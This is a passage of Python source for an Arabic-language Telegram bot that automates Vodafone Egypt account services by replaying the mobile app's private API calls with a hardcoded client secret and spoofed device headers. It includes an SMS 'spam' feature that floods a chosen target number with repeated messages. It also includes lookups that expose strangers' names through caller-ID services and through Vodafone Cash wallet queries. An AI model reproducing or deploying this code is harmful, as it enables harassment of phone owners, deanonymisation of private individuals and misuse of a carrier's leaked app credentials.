    text += f"📊 الرسالة {current_msg}/{total_msgs}\n"
    text += f"✅ الخدمات الناجحة: {successful}/{total_services} ({success_rate:.1f}%)\n\n"
    text += f"🛑 *لإيقاف الإرسال، أرسل /cancel*"
    return text

def run_spam_worker(user_id, phone, count, delay):
    """دالة تعمل في خلفية لإرسال الرسائل الإسبام"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        for i in range(count):
            if spam_sending.get(user_id, {}).get("stop_flag", False):
                user_bot.send_message(user_id, f"{EMOJI['error']} *تم إيقاف الإرسال يدويًا*", parse_mode='Markdown')
                break
            
            # إرسال الرسائل
            results = loop.run_until_complete(send_all_services(phone))
            successful = sum(1 for r in results if r['success'])
            total_services = len(results)
            
            progress_text = build_progress_text(phone, i+1, count, successful, total_services)
            
            # تحديث الرسالة
            msg_info = spam_sending.get(user_id, {})
            if msg_info.get("message_id"):
                try:
                    user_bot.edit_message_text(
                        progress_text,
                        msg_info["chat_id"],
                        msg_info["message_id"],
                        parse_mode='Markdown',
                        reply_markup=None
                    )
                except:
                    pass
            
            if i < count - 1 and not spam_sending.get(user_id, {}).get("stop_flag", False):
                time.sleep(delay)
        
        if not spam_sending.get(user_id, {}).get("stop_flag", False):
            user_bot.send_message(user_id, f"{EMOJI['success']} *تم الانتهاء من إرسال جميع الرسائل بنجاح!*", parse_mode='Markdown')
    
    except Exception as e:
        user_bot.send_message(user_id, f"{EMOJI['error']} *حدث خطأ: {str(e)}*", parse_mode='Markdown')
    
    finally:
        if user_id in spam_sending:
            del spam_sending[user_id]
        loop.close()

def handle_spam_service(user_id):
    """خدمة اسبام رسايل - بدء العملية"""
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'spam_waiting_phone',
        'phone': session['phone'],
        'password': session['password']
    }
    user_bot.send_message(
        user_id,
        f"{EMOJI['spam_messages']} *إرسال رسائل إسبام*\n\n📱 *أدخل رقم الهاتف المستهدف:*\n(مثال: 01123456789)",
        parse_mode='Markdown'
    )

def handle_spam_phone(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'spam_waiting_phone':
        return
    
    target_phone = re.sub(r'[^0-9]', '', message.text.strip())
    if not (len(target_phone) == 11 and target_phone.startswith("01")):
        user_bot.send_message(user_id, f"{EMOJI['error']} *رقم غير صحيح!*\nأدخل رقم 11 رقم يبدأ بـ 01:", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id]['target_phone'] = target_phone
    bot_status['user_data'][user_id]['action'] = 'spam_waiting_count'
    user_bot.send_message(
        user_id,
        f"{EMOJI['info']} *أدخل عدد الرسائل المراد إرسالها:*",
        parse_mode='Markdown'
    )

def handle_spam_count(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'spam_waiting_count':
        return
    
    try:
        count = int(message.text.strip())
        if count <= 0:
            user_bot.send_message(user_id, f"{EMOJI['error']} *العدد يجب أن يكون أكبر من صفر!*", parse_mode='Markdown')
            return
        if count > 100:
            user_bot.send_message(user_id, f"{EMOJI['error']} *الحد الأقصى للإرسال هو 100 رسالة في المرة الواحدة!*", parse_mode='Markdown')
            return
    except ValueError:
        user_bot.send_message(user_id, f"{EMOJI['error']} *يرجى إدخال عدد صحيح!*", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id]['count'] = count
    bot_status['user_data'][user_id]['action'] = 'spam_waiting_delay'
    user_bot.send_message(
        user_id,
        f"{EMOJI['info']} *أدخل الوقت بين كل رسالة (بالثواني):*",
        parse_mode='Markdown'
    )

def handle_spam_delay(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'spam_waiting_delay':
        return
    
    try:
        delay = float(message.text.strip())
        if delay <= 0:
            user_bot.send_message(user_id, f"{EMOJI['error']} *الوقت يجب أن يكون أكبر من صفر!*", parse_mode='Markdown')
            return
    except ValueError:
        user_bot.send_message(user_id, f"{EMOJI['error']} *يرجى إدخال وقت صحيح!*", parse_mode='Markdown')
        return
    
    target_phone = user_data.get('target_phone')
    count = user_data.get('count')
    
    # بدء الإرسال
    progress_msg = user_bot.send_message(user_id, f"{EMOJI['info']} *جاري بدء الإرسال...*", parse_mode='Markdown')
    
    # تخزين معلومات التقدم
    spam_sending[user_id] = {
        "running": True,
        "stop_flag": False,
        "message_id": progress_msg.message_id,
        "chat_id": progress_msg.chat.id
    }
    
    # تشغيل الإرسال في خيط منفصل
    thread = threading.Thread(target=run_spam_worker, args=(user_id, target_phone, count, delay))
    thread.daemon = True
    thread.start()
    
    # حذف البيانات المؤقتة
    del bot_status['user_data'][user_id]

def handle_spam_stop(user_id):
    """إيقاف خدمة الإسبام"""
    if user_id in spam_sending:
        spam_sending[user_id]["stop_flag"] = True
        user_bot.send_message(user_id, f"{EMOJI['warning']} *جاري إيقاف الإرسال...*", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['info']} *لا توجد عملية إرسال نشطة*", parse_mode='Markdown')

# ==================== دوال خدمة تقرير الخط (جديد) ====================
def get_user_full_report(token: str, phone: str) -> dict:
    """جلب التقرير الكامل للمستخدم باستخدام التوكن الحالي"""
    try:
        consumption = get_consumption_data(token, phone)
        if not consumption:
            return {"success": False, "message": "❌ فشل جلب البيانات من فودافون"}
        
        # استخراج البيانات
        data = extract_user_dashboard_data(consumption)
        
        # إضافة اسم الباقة الرئيسية
        main_bundle = get_main_bundle_name_from_subs(token, phone)
        if main_bundle:
            data["main_bundle"] = main_bundle
        else:
            data["main_bundle"] = data.get("system_type", "غير محدد")
        
        data["success"] = True
        return data
        
    except Exception as e:
        return {"success": False, "message": f"❌ حدث خطأ: {str(e)}"}

def format_line_report(data: dict) -> str:
    """تنسيق تقرير الخط بشكل جميل"""
    if not data.get("success"):
        return data.get("message", "❌ حدث خطأ غير متوقع")
    
    result = "📊 *تقرير الخط الشامل*\n"
    result += "═" * 35 + "\n\n"
    
    # النظام الحالي
    result += f"🔹 *النظام الحالي:* {data.get('main_bundle', 'غير محدد')}\n"
    
    # الرصيد الحالي
    remaining = data.get("remaining_balance")
    if remaining is not None:
        result += f"💰 *الرصيد الحالي:* {remaining:.0f} جنيه\n"
    else:
        result += f"💰 *الرصيد الحالي:* غير متوفر\n"
    
    # الفليكسات المتبقية
    flex_rem = data.get("flex_remaining")
    if flex_rem is not None:
        result += f"💪 *الفليكسات المتبقية:* {flex_rem} فليكس\n"
    else:
        result += f"💪 *الفليكسات المتبقية:* غير متوفر\n"
    
    # تاريخ تجديد الباقة
    renew_date = data.get("flex_renewal_date")
    if renew_date:
        formatted = format_date_arabic(renew_date)
        result += f"📅 *تاريخ تجديد الباقة:* {formatted}\n"
    else:
        result += f"📅 *تاريخ تجديد الباقة:* غير محدد\n"
    
    # رصيد MoneyBack
    money = data.get("money_back")
    if money is not None:
        result += f"🎁 *رصيد MoneyBack:* {int(money)} جنيه\n"
    else:
        result += f"🎁 *رصيد MoneyBack:* 0 جنيه\n"
    
    result += "\n" + "═" * 35 + "\n"
    result += "💡 *ملاحظة:* البيانات محدثة حتى الآن."
    return result

def run_line_report(phone: str, token: str) -> Tuple[bool, str]:
    """تشغيل خدمة تقرير الخط باستخدام التوكن الحالي"""
    try:
        report_data = get_user_full_report(token, phone)
        if not report_data.get("success"):
            return False, report_data.get("message", "فشل جلب البيانات")
        
        formatted = format_line_report(report_data)
        return True, formatted
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

def handle_line_report_service(user_id):
    """خدمة تقرير الخط - تعرض بيانات الخط باستخدام الجلسة الحالية"""
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    phone = session['phone']
    token = session['token']  # التوكن بدون Bearer
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري جلب تقرير الخط...*", parse_mode='Markdown')
    
    success, message = run_line_report(phone, token)
    
    if success:
        user_bot.send_message(user_id, message, parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} {message}", parse_mode='Markdown')

# ==================== دوال خدمة كروت فكه و مارد ====================
# قائمة الكروت من ملف كروت فكه.py
CARDS_LIST = [
    "Fakka_7_Unite", "Fakka_7_Social", "Fakka_2.5_Unite",
    "Fakka_2.5_Social", "Fakka_4.25_Unite", "Fakka_4.25_Social",
    "Fakka_9_Unite", "Fakka_9_Social", "Fakka_3_Unite",
    "Fakka_6_NewUnite", "Fakka_10.5_Unite", "Fakka_11.5_Unite",
    "Fakka_15.5_Unite", "Fakka_17.5_Unite", "Fakka_12_Unite",
    "Fakka_13_Unite", "Fakka_16.5_Unite", "Fakka_19.5_NewUnite",
    "Fakka_26_Unite", "Mared_10_Minuts", "Mared_10_Flexs", "Mared_10_Social"
]

def get_order_type(card_id: str) -> str:
    """تحديد نوع الطلب"""
    if "Fakka" in card_id or "Mared" in card_id:
        return "FakkaAndMared"
    else:
        return "FakkaAndMared"

def purchase_card_with_token(phone: str, token: str, card_id: str) -> Tuple[bool, str]:
    """شراء كارت باستخدام التوكن الحالي"""
    try:
        url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
        
        payload = {
            "channel": {
                "name": "MobileApp"
            },
            "orderItem": [
                {
                    "action": "insert",
                    "product": {
                        "id": card_id,
                        "relatedParty": [
                            {
                                "id": phone,
                                "name": "MSISDN",
                                "role": "Subscriber"
                            }
                        ]
                    },
                    "eCode": 0
                }
            ],
            "@type": get_order_type(card_id)
        }
        
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8",
            'api-host': "ProductOrderingManagement",
            'useCase': "FakkaAndMaredProduct",
            'Authorization': f"Bearer {token}",
            'api-version': "v2",
            'x-agent-operatingsystem': "15",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "HONOR ALI-NX1",
            'x-agent-version': "2025.11.1.1",
            'x-agent-build': "1064",
            'msisdn': phone,
            'Accept-Language': "ar"
        }
        
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=30)
        
        if response.status_code in [200, 201]:
            return True, f"✅ تم شراء الكارت {card_id} بنجاح!"
        else:
            try:
                err = response.json()
                reason = err.get("reason", response.text)
                return False, f"❌ فشل شراء الكارت: {reason}"
            except:
                return False, f"❌ فشل شراء الكارت: كود {response.status_code}"
                
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

def show_cards_list_markup():
    """عرض قائمة الكروت كأزرار إنلاين"""
    markup = types.InlineKeyboardMarkup(row_width=2)
    for i, card_id in enumerate(CARDS_LIST, 1):
        markup.add(types.InlineKeyboardButton(text=f"{i}. {card_id}", callback_data=f"buy_card_{i-1}"))
    markup.add(types.InlineKeyboardButton(text=f"{EMOJI['back']} رجوع", callback_data="back_to_main"))
    markup.add(types.InlineKeyboardButton(text=f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action"))
    return markup

def handle_cards_service(user_id):
    """خدمة كروت فكه و مارد - عرض قائمة الكروت"""
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'cards_waiting_selection',
        'phone': session['phone'],
        'token': session['token']
    }
    
    user_bot.send_message(
        user_id,
        f"{EMOJI['cards']} *كروت فكه و مارد*\n\n📱 الرقم المسجل: `{session['phone']}`\n\n👇 اختر الكارت المطلوب:",
        parse_mode='Markdown',
        reply_markup=show_cards_list_markup()
    )

def handle_buy_card_callback(call, user_id, card_index):
    """معالجة شراء كارت محدد"""
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'cards_waiting_selection':
        user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها، يرجى إعادة المحاولة")
        return
    
    try:
        idx = int(card_index)
        if idx < 0 or idx >= len(CARDS_LIST):
            user_bot.answer_callback_query(call.id, "كارت غير صالح")
            return
        selected_card = CARDS_LIST[idx]
    except:
        user_bot.answer_callback_query(call.id, "خطأ في اختيار الكارت")
        return
    
    phone = user_data.get('phone')
    token = user_data.get('token')
    
    user_bot.answer_callback_query(call.id, f"جاري شراء {selected_card}...")
    
    success, message = purchase_card_with_token(phone, token, selected_card)
    
    if success:
        user_bot.send_message(user_id, f"{EMOJI['success']} {message}\n\n📱 الرقم: `{phone}`\n🎴 الكارت: `{selected_card}`", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} {message}", parse_mode='Markdown')
    
    # لا نحذف البيانات ليبقى المستخدم في نفس القائمة، لكن نحذف الخيار بعد الشراء أو نعيد عرض القائمة
    # هنا نتركه لشراء آخر أو يضغط رجوع

# ==================== دوال خدمة الـ 14 قرش ====================
def handle_convert_14_service(user_id):
    """خدمة تحويل الرقم إلى باقة 14 قرش"""
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    phone = session['phone']
    password = session['password']
    
    # تخزين البيانات وعرض تأكيد
    bot_status['user_data'][user_id] = {
        'action': 'convert14_confirm',
        'phone': phone,
        'password': password
    }
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ تأكيد التحويل", callback_data="convert14_confirm"),
        types.InlineKeyboardButton(f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action")
    )
    user_bot.send_message(
        user_id,
        f"{EMOJI['convert_14']} *تحويل 14 قرش*\n\n📱 الرقم: `{phone}`\n📦 الباقة: ريح بالك كله ب14 قرش\n\n⚠️ هل تريد تنفيذ عملية التحويل؟",
        parse_mode='Markdown',
        reply_markup=markup
    )

def execute_convert_14(call, user_id):
    """تنفيذ تحويل 14 قرش بعد التأكيد"""
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'convert14_confirm':
        user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها")
        return
    
    phone = user_data.get('phone')
    password = user_data.get('password')
    
    user_bot.answer_callback_query(call.id, "جاري التحويل...")
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري تحويل الرقم إلى باقة 14 قرش...*", parse_mode='Markdown')
    
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
    
    success, message = run_convert_14_piaster(phone, password)
    
    if success:
        user_bot.send_message(user_id, f"{EMOJI['success']} {message}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} {message}", parse_mode='Markdown')

# ==================== دوال خدمة تروكولر ====================
def run_trucaller(target_number: str) -> Tuple[bool, str]:
    """البحث عن اسم الرقم باستخدام خدمة تروكولر"""
    try:
        clean_number = target_number.replace('+', '').replace(' ', '')
        if not clean_number.startswith('01'):
            clean_number = '2' + clean_number if len(clean_number) == 11 else clean_number
        
        url1 = "https://s.callapp.com/callapp-server/csrch"
        params1 = {
            'cpn': f"+2{clean_number}",
            'myp': "+201026701026",
            'ibs': "0",
            'cid': "0",
            'tk': "0007824515",
            'cvc': "2204"
        }
        headers1 = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 12)",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        response1 = requests.get(url1, params=params1, headers=headers1, timeout=10)
        name1 = "غير متاح"
        if response1.status_code == 200:
            try:
                data1 = response1.json()
                name1 = data1.get("name", "غير متاح")
            except:
                pass
        
        result = f"🔍 *نتيجة البحث عن الرقم:*\n📱 {target_number}\n"
        result += f"• الاسم من CallApp: {name1}\n"
        
        # Eyecon Search
        url2 = "https://api.eyecon-app.com/app/getnames.jsp"
        params2 = {
            'cli': f"2{clean_number}",
            'lang': "en",
            'is_callerid': "true",
            'is_ic': "true",
            'cv': "vc_538_vn_4.0.538_a",
            'requestApi': "URLconnection",
            'source': "SocialIdOptionSelectorDialog",
            'is_search': "true"
        }
        headers2 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; x64)",
            "Connection": "Keep-Alive",
            "Accept": "application/json",
            "Accept-Encoding": "gzip",
        }
        response2 = requests.get(url2, params=params2, headers=headers2, timeout=10)
        names = []
        if response2.status_code == 200:
            try:
                data2 = response2.json()
                if isinstance(data2, list):
                    names = [item.get("name", "مجهول") for item in data2 if item.get("name")]
            except:
                pass
        if names:
            for idx, name in enumerate(names[:3], start=1):
                result += f"• الاسم ({idx}) من Eyecon: {name}\n"
        else:
            result += f"• Eyecon: لا يوجد أسماء إضافية.\n"
        
        result += f"\n📱 رابط الواتساب: https://wa.me/2{clean_number}"
        return True, result
    except Exception as e:
        return False, f"❌ خطأ غير متوقع: {str(e)}"

def handle_trucaller_service(user_id):
    """خدمة تروكولر - البحث عن رقم"""
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'trucaller_waiting_number',
        'phone': session['phone'],
        'password': session['password']
    }
    user_bot.send_message(
        user_id,
        f"{EMOJI['trucaller']} *البحث عن رقم (تروكولر)*\n\n📱 *أدخل رقم الهاتف المراد البحث عنه:*\n(مثال: 01001234567)",
        parse_mode='Markdown'
    )

def handle_trucaller_number(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'trucaller_waiting_number':
        return
    
    target_number = re.sub(r'[^0-9]', '', message.text.strip())
    if len(target_number) not in [10, 11]:
        user_bot.send_message(user_id, f"{EMOJI['error']} *رقم غير صحيح!*", parse_mode='Markdown')
        return
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري البحث عن الرقم...*", parse_mode='Markdown')
    
    success, message = run_trucaller(target_number)
    
    if success:
        user_bot.send_message(user_id, message, parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} {message}", parse_mode='Markdown')
    
    del bot_status['user_data'][user_id]

# ==================== دوال خدمة فحص كاش ====================
def search_wallet_owner_service(access_token: str, sender_msisdn: str, target_number: str) -> Optional[str]:
    """البحث عن اسم صاحب محفظة فودافون كاش"""
    url = "https://mobile.vodafone.com.eg/services/dxl/paymentmng/payment"
    
    params = {
        'payer.id': sender_msisdn,
        '$.paymentMethod.relatedParty.id': target_number,
        '$.amount.value': "1",
        '$.account.type': "Vodafone Consumer",
        '@type': "CashMandate"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "close",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'X-Request-ID': str(uuid.uuid4()),
        'device-id': "5410d95ad4bb11cc",
        'Content-Type': "application/json",
        'api-version': "v2",
        'msisdn': sender_msisdn,
        'Authorization': f"Bearer {access_token}",
        'Accept-Language': "ar",
        'clientId': "AnaVodafoneAndroid",
        'digitalId': "2A2EABH5DY98Q"
    }
    
    try:
        response = requests.get(url, params=params, headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if isinstance(data, list) and len(data) > 0:
                item = data[0]
                if 'paymentMethod' in item and 'relatedParty' in item['paymentMethod']:
                    name = item['paymentMethod']['relatedParty'].get('name')
                    if name:
                        return name
            elif isinstance(data, dict):
                if 'paymentMethod' in data and 'relatedParty' in data['paymentMethod']:
                    name = data['paymentMethod']['relatedParty'].get('name')
                    if name:
                        return name
        return None
    except Exception:
        return None

def run_wallet_search(phone: str, password: str, target_number: str) -> Tuple[bool, str]:
    """تشغيل خدمة البحث عن محفظة فودافون كاش"""
    try:
        auth_result = get_authorization(phone, password)
        if not auth_result['success']:
            return False, f"❌ فشل تسجيل الدخول: {auth_result['message']}"
        
        token = auth_result['token']
        name = search_wallet_owner_service(token, phone, target_number)
        
        result = f"🔍 *نتيجة البحث عن رقم فودافون كاش:*\n📱 {target_number}\n"
        if name:
            result += f"👤 الاسم: {name}\n✅ هذا الرقم مسجل في فودافون كاش ولديه محفظة نشطة."
        else:
            result += f"❌ لم يتم العثور على اسم.\n⚠️ إما أن الرقم غير مسجل في فودافون كاش، أو أن المحفظة غير مفعلة."
        
        return True, result
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

def handle_wallet_search_service(user_id):
    """خدمة فحص كاش - البحث عن صاحب محفظة فودافون كاش"""
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'wallet_search_waiting_number',
        'phone': session['phone'],
        'password': session['password']
    }
    user_bot.send_message(
        user_id,
        f"{EMOJI['wallet_search']} *فحص كاش*\n\n📱 *أدخل رقم الهاتف المراد الاستعلام عنه:*\n(مثال: 01001234567)",
        parse_mode='Markdown'
    )

def handle_wallet_search_number(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'wallet_search_waiting_number':
        return
    
    target_number = re.sub(r'[^0-9]', '', message.text.strip())
    # التحقق من الرقم: 11 رقم يبدأ بـ 01
    if len(target_number) != 11 or not target_number.startswith('01'):
        user_bot.send_message(
            user_id,
            f"{EMOJI['error']} *رقم غير صحيح!*\n\n📱 يجب أن يكون الرقم 11 رقم ويبدأ بـ 01\nمثال: 01001234567\n\nأرسل الرقم مرة أخرى:",
            parse_mode='Markdown'
        )
        # نبقى في نفس الـ action عشان يقدر يعيد المحاولة بدون ما يضغط الزر من أول
        return
    
    # تخزين الرقم وانتظار التأكيد
    bot_status['user_data'][user_id]['target_number'] = target_number
    bot_status['user_data'][user_id]['action'] = 'wallet_search_confirm'
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ تأكيد", callback_data="wallet_search_confirm"),
        types.InlineKeyboardButton(f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action")
    )
    user_bot.send_message(
        user_id,
        f"{EMOJI['wallet_search']} *تأكيد البحث*\n\n📱 الرقم: `{target_number}`\n\nهل تريد البحث عن هذا الرقم في فودافون كاش؟",
        parse_mode='Markdown',
        reply_markup=markup
    )

def execute_wallet_search(user_id):
    """تنفيذ البحث عن المحفظة بعد التأكيد"""
    user_data = bot_status['user_data'].get(user_id, {})
    if not user_data:
        return
    
    phone = user_data.get('phone')
    password = user_data.get('password')
    target_number = user_data.get('target_number')
    
    if not all([phone, password, target_number]):
        user_bot.send_message(user_id, f"{EMOJI['error']} *حدث خطأ في البيانات*", parse_mode='Markdown')
        if user_id in bot_status['user_data']:
            del bot_status['user_data'][user_id]
        return
    
    # رسالة انتظار قبل الـ API call
    loading_msg = user_bot.send_message(
        user_id,
        f"{EMOJI['wallet_search']} *جاري البحث عن المحفظة...*\n\n⏳ انتظر لحظة...",
        parse_mode='Markdown'
    )
    
    success, result_msg = run_wallet_search(phone, password, target_number)
    
    # حذف رسالة الانتظار وإرسال النتيجة
    try:
        user_bot.delete_message(user_id, loading_msg.message_id)
    except:
        pass
    
    if success:
        user_bot.send_message(user_id, result_msg, parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} {result_msg}", parse_mode='Markdown')
    
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]

# ==================== دوال خدمة شحن كارت ====================
def login_recharge(phone: str, password: str) -> Tuple[bool, Optional[str]]:
    """تسجيل الدخول لإعادة الشحن"""
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    
    payload = {
        'grant_type': "password",
        'username': phone,
        'password': password,
        'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
        'client_id': "ana-vodafone-app"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip",
        'silentLogin': "true",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'Accept-Language': "ar",
        'x-agent-device': "Realme RMX3871",
        'x-agent-version': "2025.10.3",
        'x-agent-build': "1050",
        'digitalId': "23ZYFNE2R7G1W",
        'device-id': "060372c24b51d07a"
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=30)
        if response.status_code == 200:
            data = response.json()
            return True, data.get('access_token')
        return False, None
    except:
        return False, None

def recharge_card(phone: str, token: str, card_number: str, target_phone: str = None) -> Tuple[bool, str]:
    """شحن كارت فودافون"""
    url = "https://web.vodafone.com.eg/services/dxl/paymentmng/payment"
    
    payer_msisdn = target_phone if target_phone else phone
    
    payload = {
        "payer": {
            "id": payer_msisdn
        },
        "paymentItem": [
            {
                "item": {
                    "@referredType": "RechargeScratchCard"
                }
            }
        ],
        "paymentMethod": {
            "id": card_number,
            "@type": "Voucher"
        },
        "channel": {
            "characteristics": [
                {
                    "name": "digitalTransactionId",
                    "value": "bju8y617a1769001348811"
                }
            ]
        }
    }

    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        'Accept': "application/json",
        'Content-Type': "application/json",
        'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
        'api_id': "WEB",
        'msisdn': phone,
        'Accept-Language': "AR",
        'useCase': "creditCardHistory",
        'sec-ch-ua-mobile': "?1",
        'Authorization': f"Bearer {token}",
        'x-dtpc': "13$201328891_440h24vDFWORUORUVVANDMWFUBPBPRAVKKLALNP-0e0",
        'clientId': "WebsiteConsumer",
        'sec-ch-ua-platform': "\"Android\"",
        'Origin': "https://web.vodafone.com.eg",
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://web.vodafone.com.eg/spa/recharge"
    }

    try:
        response = requests.post(url, json=payload, headers=headers, timeout=30)
        result = response.json()
        if response.status_code == 200:
            return True, "✅ تمت عملية الشحن بنجاح!"
        else:
            code = result.get('code', 'غير معروف')
            reason = result.get('reason', 'حدث خطأ غير معروف')
            return False, f"❌ فشل الشحن - الرمز: {code}\n📝 السبب: {reason}"
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

def handle_recharge_service(user_id):
    """خدمة شحن كارت - متعددة الخطوات"""
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'recharge_waiting_card',
        'phone': session['phone'],
        'password': session['password'],
        'token': session['token']
    }
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("نفس الرقم المسجل", callback_data="recharge_same_phone"),
        types.InlineKeyboardButton("رقم آخر", callback_data="recharge_other_phone"),
        types.InlineKeyboardButton(f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action")
    )
    user_bot.send_message(
        user_id,
        f"{EMOJI['recharge']} *شحن كارت*\n\n📱 الرقم المسجل: `{session['phone']}`\n\n👇 اختر الجهة المراد الشحن لها:",
        parse_mode='Markdown',
        reply_markup=markup
    )

def handle_recharge_phone_callback(call, user_id, choice):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'recharge_waiting_card':
        user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها، يرجى إعادة المحاولة")
        return
    
    if choice == 'same':
        user_data['target_phone'] = user_data.get('phone')
    else:
        bot_status['user_data'][user_id]['action'] = 'recharge_waiting_other_phone'
        user_bot.answer_callback_query(call.id, "أدخل الرقم الآخر")
        user_bot.send_message(
            user_id,
            f"{EMOJI['info']} *أدخل رقم الهاتف المراد الشحن له:*\n(مثال: 01001234567)",
            parse_mode='Markdown'
        )
        return
    
    bot_status['user_data'][user_id]['action'] = 'recharge_waiting_card'
    user_bot.answer_callback_query(call.id, "تم اختيار الرقم")
    user_bot.send_message(
        user_id,
        f"{EMOJI['info']} *أدخل رقم الكارت:*",
        parse_mode='Markdown'
    )

def handle_recharge_other_phone(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'recharge_waiting_other_phone':
        return
    
    target_phone = re.sub(r'[^0-9]', '', message.text.strip())
    if len(target_phone) not in [10, 11]:
        user_bot.send_message(user_id, f"{EMOJI['error']} *رقم غير صحيح!*", parse_mode='Markdown')
